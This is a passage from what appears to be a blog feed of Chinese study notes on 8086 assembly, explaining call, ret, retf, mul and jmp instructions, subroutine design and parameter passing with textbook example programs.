        <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p> 1.程序之间的加载和返回</p><p>2.call和ret指令都是转移指令，它们大都修改IP，或者同时修改CS和IP</p><p>3.它们经常被同用来实现自程序的设计</p><h2 id="1-ret和retf-指令"><a href="#1-ret和retf-指令" class="headerlink" title="1.ret和retf  指令"></a>1.ret和retf  指令</h2><p>1.ret指令是用栈中的数据，修改IP的内容，从而实现进转移</p><p>2.在CPU执行ret指令的时候</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.(IP)=((SS)*16+(SP))</span><br><span class="line">2.(sp)=(sp)+2</span><br><span class="line">IP中的值变成ss:[sp]中的</span><br><span class="line">sp+2【】</span><br><span class="line"></span><br><span class="line">pop ip</span><br></pre></td></tr></table></figure><p>3.retf指令用栈中的数据，修改CS和IP的内容，从而实现远转移</p><p>4.在CPU执行retf指令的时候</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.</span><br><span class="line">(IP)=((ss)*16+(sp))</span><br><span class="line">(sp)=(sp)+2</span><br><span class="line">2.</span><br><span class="line">(cs)=((ss)*16+(sp))</span><br><span class="line">(sp)=(sp)+2</span><br><span class="line">低地址放的是ip，高地址放cs，都是字型单位</span><br><span class="line"></span><br><span class="line">pop ip</span><br><span class="line">pop cs </span><br></pre></td></tr></table></figure><h2 id="2-call指令"><a href="#2-call指令" class="headerlink" title="2.call指令"></a>2.call指令</h2><p>1.call指令经常和ret指令配合使用，因此CPU执行call指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.当前的IP或者CS和IP压入栈中</span><br><span class="line">2.转移(jmp)</span><br></pre></td></tr></table></figure><p>2.call指令不能实现段转移，除此之外，call指令实现转移的方法和jmp指令的原理相同</p><h2 id="3-依据位移进行转移的call指令"><a href="#3-依据位移进行转移的call指令" class="headerlink" title="3.依据位移进行转移的call指令"></a>3.依据位移进行转移的call指令</h2><p>1.格式：call 标号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">将当前的IP压入栈后，转移到标号处指令指令</span><br><span class="line">相当于：</span><br><span class="line">push IP</span><br><span class="line">jmp near ptr 标号</span><br></pre></td></tr></table></figure><p>2.CPU</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.  (SP)=(SP)-2</span><br><span class="line">((ss)*16+(sp))=(IP);这一步感觉就像是：push 当前的IP[这么理解就错了]【它是push  call 指令的下一条指令的IP】</span><br><span class="line">2.(IP)=(IP)+16位位移</span><br><span class="line">;这里和jmp的依据位移进行转移差不多也就是</span><br><span class="line">“标号”处的地址-jmp指令后的第一个字节的地址;相互减</span><br><span class="line">这里必须是16位的，不能是8位的哦</span><br><span class="line">16位的范围</span><br><span class="line">-32768~32767</span><br></pre></td></tr></table></figure><h2 id="4-转移的目的地址在指令中的call指令"><a href="#4-转移的目的地址在指令中的call指令" class="headerlink" title="4.转移的目的地址在指令中的call指令"></a>4.转移的目的地址在指令中的call指令</h2><p>1.call far ptr 标号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.</span><br><span class="line">(sp)=(sp)-2</span><br><span class="line">((ss)*16+(sp))=(cs)</span><br><span class="line">(sp)=(sp-2)</span><br><span class="line">((ss)*16+(sp))=(ip)</span><br><span class="line">2.</span><br><span class="line">(cs)=标号处的段地址</span><br><span class="line">(ip)=标号所在的偏移地址</span><br><span class="line">3.</span><br><span class="line">push CS</span><br><span class="line">push IP</span><br><span class="line">jmp far ptr 标号</span><br></pre></td></tr></table></figure><h2 id="5-转移地址在寄存器中的call指令"><a href="#5-转移地址在寄存器中的call指令" class="headerlink" title="5.转移地址在寄存器中的call指令"></a>5.转移地址在寄存器中的call指令</h2><p>1.格式：call 16位寄存器</p><p>2.功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">()=(sp)-2</span><br><span class="line">((ss)*16+(sp))=(ip)</span><br><span class="line">(ip)=(16位寄存器)</span><br><span class="line"></span><br><span class="line">push IP</span><br><span class="line">jmp 16位寄存器</span><br></pre></td></tr></table></figure><h2 id="6转移地址在内存中的call指令"><a href="#6转移地址在内存中的call指令" class="headerlink" title="6转移地址在内存中的call指令"></a>6转移地址在内存中的call指令</h2><p>1.call word ptr 内存单元地址</p><p>安装字型的数据来索引【短转移】 </p><p>2.call dword ptr 内存单元地址</p><p>高cs 低 ip </p><h2 id="7-call和ret的配合使用"><a href="#7-call和ret的配合使用" class="headerlink" title="7.call和ret的配合使用"></a>7.call和ret的配合使用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">stack segment</span><br><span class="line">db 8 dup(0)1000:0000   00 00 00 00 00 00 00 00</span><br><span class="line">db 8 dup(0)1000:0008   00 00 00 00 00 00 00 00</span><br><span class="line">stack ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">start:mov ax,stack1001:0000B8 00 10 </span><br><span class="line">mov ss,ax1001:00038E D0</span><br><span class="line">mov sp,161001:0005BC 10 00</span><br><span class="line">mov ax,10001001:0008B8 E8 03</span><br><span class="line">call s1001:000BE8 05 00</span><br><span class="line">mov ax,4c00H1001:000EB8 00 4C</span><br><span class="line">int 21h1001:0011CD 21</span><br><span class="line">s:add ax,ax1001:001303 C0</span><br><span class="line">ret1001:0015C3</span><br><span class="line">code ends</span><br><span class="line">endstart</span><br></pre></td></tr></table></figure><p>让我们来看看程序的主要执行过程</p><p>1，前三条指令执行后，栈的情况如下：</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230413204516225.png" alt="image-20230413204516225"></p><p>2.call 指令读入后，(IP)=00EH，cpu指令缓冲器中的代码是     B8 05 00</p><p>cpu执行B8 05 00；首先栈中的变化为： </p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230413204646240.png" alt="image-20230413204646240"></p><p>然后，(IP)=(IP)+0005=0013H</p><p>3.CPU从cs:0013H处（即标号s处）开始执行</p><p>4.ret指令读入后：（IP）=0016H【IP永远都是指向的下一个指令，将要执行的IP】，cpu指令缓冲区中的代码为C3</p><p>​    当CPU执行C3，相当于进行pop IP，执行后，栈中的情况为</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230413205239588.png" alt="image-20230413205239588"></p><p>（IP）=000EH</p><p>5.CPU回到cs:000EH处(即call指令后面的指令处)继续执行</p><p>从上面的讨论中我们发现，可以写一个具有一定功能的程序段，我们称其为子程序，在需要的时候，用call指令转去执行</p><p>可是执行完子程序后，如何让CPU接着call指令向下执行？</p><p>没错就是ret</p><p>call指令后面的指令的地址存储在栈中，所以可以在子程序后面使用ret指令，用栈中的数据设置IP的值，从而转到call指令后面的代码继续执行</p><p>这样，我们可以利用call和ret来实现子程序的机制【函数】</p><h2 id="8-mul-指令"><a href="#8-mul-指令" class="headerlink" title="8.mul 指令"></a>8.mul 指令</h2><p>1.因下面要用到，所以我们就来介绍一下mul指令，mul是乘法指令，使用mul做乘法的时候</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.相乘的2个数，要么都是8位，要么都是16位</span><br><span class="line">8位：al中和8位寄存器或内存字节单元中</span><br><span class="line">16位：ax中和16位寄存器或内存字单元中</span><br></pre></td></tr></table></figure><p>2.结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">8位：AX中</span><br><span class="line">16位：DX（高位）和AX（低位）中</span><br></pre></td></tr></table></figure><p>3.格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mul reg【寄存器】</span><br><span class="line">mul 内存单元</span><br></pre></td></tr></table></figure><p>1.mul byte ptr ds:[0]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">8位的</span><br><span class="line">含义：(ax)=(al)*((ds)*16+0)</span><br><span class="line">乘数一个由mul给处一个是在al中</span><br></pre></td></tr></table></figure><p>2.mul word ptr [bx+si+8]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">16位：</span><br><span class="line">含义位：</span><br><span class="line">(ax)=(ax)*((ds)*16+(bx)+8)结果的低16位</span><br><span class="line">(dx)=(ax)*((ds)*16+(bx)+8)结果的高16位</span><br><span class="line">乘数一个由mul给出一个由ax中</span><br></pre></td></tr></table></figure><p>比如：100*10</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov al,100</span><br><span class="line">mov bl,10</span><br><span class="line">mul bl</span><br></pre></td></tr></table></figure><p>比如：100*10000</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,100</span><br><span class="line">mov bx,10000</span><br><span class="line">mul bx</span><br></pre></td></tr></table></figure><h2 id="9-模块化程序设计"><a href="#9-模块化程序设计" class="headerlink" title="9.模块化程序设计"></a>9.模块化程序设计</h2><p>从上面我们看到，call和ret指令共同支持了汇编语言编程中的模块化设计，在实际编程中，程序的模块化是必不可少的</p><p>用call和ret指令==【面对过程的思想】</p><h2 id="10-参数和结果传递的问题"><a href="#10-参数和结果传递的问题" class="headerlink" title="10.参数和结果传递的问题"></a>10.参数和结果传递的问题</h2><p>子程序一般都要根据提供的参数处理一定的事务，处理后，将结果(返回值)提供给调用者</p><p>其实，我们讨论参数和返回值传递的问题，实际上是在探讨，应该如何存储子程序需要的参数和产生的返回值</p><p>我们设计一个子程序，可以根据提供的N，来计算N的3次方</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.我们将这个参数N存储在什么地方？</span><br><span class="line">很显然，用寄存器来存储。可以将参数放到bx中</span><br><span class="line">2.计算得到的数值，我们存储在什么地方？</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cube:mov ax,bx</span><br><span class="line">mul bx</span><br><span class="line">mul bx                       </span><br><span class="line">ret</span><br></pre></td></tr></table></figure><h2 id="11-批量数据的传递"><a href="#11-批量数据的传递" class="headerlink" title="11.批量数据的传递"></a>11.批量数据的传递</h2><p>前面的例程中，子程序cube只有一个参数放在bx中。如果有两个参数，那么可以用两个寄存器来放，可是如果需要传递的数据有3个4个甚至多到N个呢，我们应该如何存放呢？</p><p>这个时候，我们将数据放在内存中，然后它们所在内存空间的首地址放在寄存器中，传递给需要的子程序。对于具有批量数据的返回结果，也可用同样的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">data segment</span><br><span class="line">db &#x27;conversation&#x27;</span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">start:movax,data</span><br><span class="line">mov ds,ax</span><br><span class="line">mov si,0;ds:[si]指向字符串（批量数据）所在空间的首地址</span><br><span class="line">mov cx,12;cx 存放字符串的长度</span><br><span class="line">call capital</span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">capital:and byte ptr [si],11011111B;将ds:si所指单元中的字母转化为大写</span><br><span class="line">inc si;ds:si 指向下一个单元</span><br><span class="line">loop capital</span><br><span class="line">ret</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>注意，除了用寄存器传递参数外，还有一种通用的方法是用栈来传递参数。</p><h2 id="12-寄存器冲突的问题-10-12-play"><a href="#12-寄存器冲突的问题-10-12-play" class="headerlink" title="12.寄存器冲突的问题[10.12.play]"></a>12.寄存器冲突的问题[10.12.play]</h2><p>设计一个子程序，功能：将一个全是字母，以0结尾的字符串，转化为大写</p><p>程序要处理的字符串以0作为结尾符，这个字符串可以定义</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db &#x27;conversation&#x27;,0</span><br></pre></td></tr></table></figure><p>应用这个子程序，字符串的内容后面一定要有一个 0 ，标记字符串的结束。子程序可以依次读取每一个字符进行检测，如果不是0 ，就进行大写的转化；如果是0，就结束处理。由于可通过检测0而知道是否处理完这整个字符串，所以子程序不需要字符串的长度作为参数。可以用jcxz来检测0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">capital:push cx</span><br><span class="line">push si</span><br><span class="line"></span><br><span class="line">mov cl,[si]</span><br><span class="line">mov ch,0</span><br><span class="line">jcxz ok</span><br><span class="line">and byte ptr [si],11011111B</span><br><span class="line">inc si</span><br><span class="line">jmp short capital</span><br><span class="line"></span><br><span class="line">ok:pop si</span><br><span class="line">pop cx</span><br><span class="line">ret</span><br><span class="line">这个就是说cl是data中的数据，当访问到0的时候就去运行了jcxz</span><br></pre></td></tr></table></figure><h2 id="实验10"><a href="#实验10" class="headerlink" title="实验10"></a>实验10</h2><p>编写子程序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXP 自己查看</span><br></pre></td></tr></table></figure><h2 id="自我总结一下最近学的把"><a href="#自我总结一下最近学的把" class="headerlink" title="自我总结一下最近学的把"></a>自我总结一下最近学的把</h2><p>1.乘法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">首先乘法：mul 乘数2</span><br><span class="line">乘数1，是在寄存器或者内存单元中</span><br><span class="line">乘数2如果是</span><br><span class="line">8位：得到的是一个16位的数，放在ax中</span><br><span class="line">16位：得到的是一个32位的数，放在dx【高】和ax【低】</span><br></pre></td></tr></table></figure><p>2.除法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">然后是除法：div 除数</span><br><span class="line">被除数可能是ax也可能是dx和ax</span><br><span class="line"></span><br><span class="line">当除数是8位的时候，就调用的是ax</span><br><span class="line">当除数是16位的时候，就调用dx和ax</span><br><span class="line"></span><br><span class="line">8位的时候，al中放的是商ah中放的是余数</span><br><span class="line">16位的时候，ax中放的是商dx中放的是余数</span><br><span class="line"></span><br><span class="line">这个8位还是16位</span><br><span class="line">看的是寄存器或者是内存空间的大小</span><br></pre></td></tr></table></figure><p>3.循环的使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.已知或者能求出循环次数的循环</span><br><span class="line">用 cx 和 loop</span><br><span class="line">2.未知循环次数的循环</span><br><span class="line">用cl和ch的结合 或者 cx 和jcxz</span><br></pre></td></tr></table></figure><p>loop 如何使用呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这个很简单，设定循环的次数，cx</span><br><span class="line">写入代码 </span><br><span class="line">loop 标号</span><br><span class="line">就好了</span><br></pre></td></tr></table></figure><p>jcxz 如何使用呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">这个比较复杂，我已知2种办法</span><br><span class="line">1.对于 对字符串的处理【这里需要设置字符串的结束条件是0】</span><br><span class="line">这样可以设置</span><br><span class="line">s:mov ch,0</span><br><span class="line">mov cl,ds:[si]</span><br><span class="line">jcxz 标号【可以跳出去，这里是跳出循环】</span><br><span class="line">代码</span><br><span class="line">jmp short s【写了这个过后，它就会一直循环到标号s处，知道某个条件也就是cl=0的时候就会从jcxz挑走】</span><br><span class="line"></span><br><span class="line">2.对于除法，需要取出某个数种的每一个数的时候</span><br><span class="line">可以这样设置</span><br><span class="line">s:div 某个16位mov ch,0</span><br><span class="line">mov cx,ax    div 某个8位</span><br><span class="line">          mov cl,al</span><br><span class="line">          </span><br><span class="line">       jcxz 标号</span><br><span class="line">       </span><br><span class="line">       jmp short s</span><br><span class="line">       </span><br><span class="line">总的来说，在标号和 jmp short 标号 中间的都是循环语句，在中间的jcxz在满足条件的时候才会跳出去</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 8086汇编 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>8086汇编-转移指令的原理（9）</title>
      <link href="/2023/05/01/8086%E6%B1%87%E7%BC%96-9-%E8%BD%AC%E7%A7%BB%E6%8C%87%E4%BB%A4%E7%9A%84%E5%8E%9F%E7%90%86/"/>
      <url>/2023/05/01/8086%E6%B1%87%E7%BC%96-9-%E8%BD%AC%E7%A7%BB%E6%8C%87%E4%BB%A4%E7%9A%84%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>1.8086CPU的转移指令分为以下几个类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.无条件转移指令【jmp】</span><br><span class="line">2.条件转移指令</span><br><span class="line">3.循环指令【loop】</span><br><span class="line">4.过程</span><br><span class="line">5.中断</span><br></pre></td></tr></table></figure><h2 id="1-操作符offset"><a href="#1-操作符offset" class="headerlink" title="1.操作符offset"></a>1.操作符offset</h2><p>1.offset：伪指令，取得标号的偏移地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">start:mov ax,offset start ;相当于mov ax,0 就是取得start这个标号的偏移地址</span><br><span class="line">s:mov ax,offset s;相当于mov ax,3 也是去取得了s这个标号的偏移地址 </span><br></pre></td></tr></table></figure><p>小小的练习</p><p>填写指令，使改程序在运行中将s处的一条指令复制到s0处</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">s:mov ax,bx;mov ax,bx的机器码占2个字节</span><br><span class="line">mov si,offset s</span><br><span class="line">mov di,offset s0</span><br><span class="line">__________</span><br><span class="line">__________</span><br><span class="line"></span><br><span class="line">s0:nop</span><br><span class="line">nop</span><br><span class="line">codesg ends</span><br><span class="line">end s</span><br></pre></td></tr></table></figure><p>分析一下咯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.s和s0处的指令所在的内存地址是多少？</span><br><span class="line">cs:offset s 和 cs:offset s0</span><br><span class="line">因为这个指令是在cs:ip下的咯</span><br><span class="line">2.将s处的指令复制到s0处，将cs:offset s处的数据复制到cs:offset s0处</span><br><span class="line">因为它们底层的代码【二进制】是一样的</span><br><span class="line">3.段地址已知在cs中，偏移地址offset s 和 pffset s0 送入 si和di中</span><br><span class="line"></span><br><span class="line">4.要复制的数据长度有多长？</span><br><span class="line">mov ax,bx</span><br><span class="line">    指令的 长度是2个字节</span><br></pre></td></tr></table></figure><p>程序来咯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">s:mov ax,bx;mov ax,bx的机器码占2个字节</span><br><span class="line">mov si,offset s</span><br><span class="line">mov di,offset s0</span><br><span class="line">mov ax,cs:[si]</span><br><span class="line">mov cs:[di],ax</span><br><span class="line"></span><br><span class="line">s0:nop</span><br><span class="line">nop</span><br><span class="line">codesg ends</span><br><span class="line">end s</span><br></pre></td></tr></table></figure><h2 id="2-jmp指令"><a href="#2-jmp指令" class="headerlink" title="2.jmp指令"></a>2.jmp指令</h2><p>1.jmp为无条件转移，可以只修改IP，也可以同时修改CS和IP</p><p>2.jmp指令要给处俩种信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.转移的目的地址</span><br><span class="line">2.转移的距离（段间转移，段内段转移，段内近转移）</span><br></pre></td></tr></table></figure><h2 id="3-依据位移进行转移的jmp指令"><a href="#3-依据位移进行转移的jmp指令" class="headerlink" title="3.依据位移进行转移的jmp指令"></a>3.依据位移进行转移的jmp指令</h2><p>1.jmp short 标号(转到标号处执行指令)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这种格式的jmp指令实现的是段内短转移，它对IP的修改范围是-128~127，也就是说，它向前可以越过128个字节，向后可以最多越过127个字节【越后面数越大】</span><br></pre></td></tr></table></figure><p>比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg;左边的程序执行后，ax种的值为1，因为执行</span><br><span class="line">csdesg segment;jmp short s 后，越过了add ax,1 ip指向</span><br><span class="line">start:mov ax,0;了标号s处的inc ax。也就是说程序只进行了</span><br><span class="line">jmp short s;一次 ax加1操作</span><br><span class="line">add ax,1</span><br><span class="line">s:inc ax;在这个jmp中所对应的机器码是没有对应的地址的</span><br><span class="line">codesg ends;而是有偏移地址，某个数【执行了add IP,某个数】</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>2.jmp short s指令的读取和执行过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.(cs)=0BBDH,(IP)=0006,CS:IP指向EB 03(jmp short s 的机器码)</span><br><span class="line">2.读取指令码 EB 03 进入指令缓冲器；</span><br><span class="line">3.(IP)=(IP)+所读指令的长度==&gt;(IP)+2=0008,cs:ip指向add ax,1</span><br><span class="line">4.CPU指向指令缓冲器中的指令EB 03;</span><br><span class="line">5.指令EB 03 执行后，(IP)=000BH,CS:IP指向 inc ax</span><br></pre></td></tr></table></figure><p>3.实际上，指令“jmp short 标号”的功能为(IP)=(IP)+8位位移</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.8位位移=“标号”处的地址-jmp指令后的第一个字节的地址;相互减</span><br><span class="line">2.short 指明此处的位移为8位位移</span><br><span class="line">3.8位位移的范围为-128~127，用补码表示</span><br><span class="line">4.8位位移由编译程序在编译时算出</span><br><span class="line"></span><br><span class="line">！！它不给地址，只给偏移地址！！</span><br></pre></td></tr></table></figure><p>4.还有一种和“jmp short 标号”功能相近的指令格式</p><p>==&gt;jmp near ptr 标号</p><p>功能就是</p><p>IP=IP+16位位移</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.16位位移=“标号”处的地址 - jmp指令后的第一个字节的地址</span><br><span class="line">2.near ptr 指明此处的16位位移，进行的是段内进转移</span><br><span class="line">3.16位位移的范围：-32768~32767，用补码表示</span><br><span class="line">4.16位位移由编译程序在编译时算出</span><br></pre></td></tr></table></figure><h2 id="4-转移的目的地址在指令中的jmp指令"><a href="#4-转移的目的地址在指令中的jmp指令" class="headerlink" title="4.转移的目的地址在指令中的jmp指令"></a>4.转移的目的地址在指令中的jmp指令</h2><p>1.前面讲的jmp指令，其对应的机器码中并没有转移目的的地址，而是相对于当前IP的转移位移</p><p>2.现在要有一个新的</p><h4 id="jmp-far-ptr-标号：实现的是段间转移，又称为远转移"><a href="#jmp-far-ptr-标号：实现的是段间转移，又称为远转移" class="headerlink" title="jmp far ptr 标号：实现的是段间转移，又称为远转移"></a>jmp far ptr 标号：实现的是段间转移，又称为远转移</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.(CS)=标号所在段的段地址</span><br><span class="line">2.(IP)=标号所在段中的偏移地址</span><br><span class="line">3.far ptr 指明了指令用标号的段地址和偏移地址修改CS和IP</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">start:mov ax,0</span><br><span class="line">mov bx,0</span><br><span class="line">jmp far ptr s;jmp所对应的机器码其中是包含转移的目标地址的</span><br><span class="line">db 256 dup(0)</span><br><span class="line">s:add ax,1</span><br><span 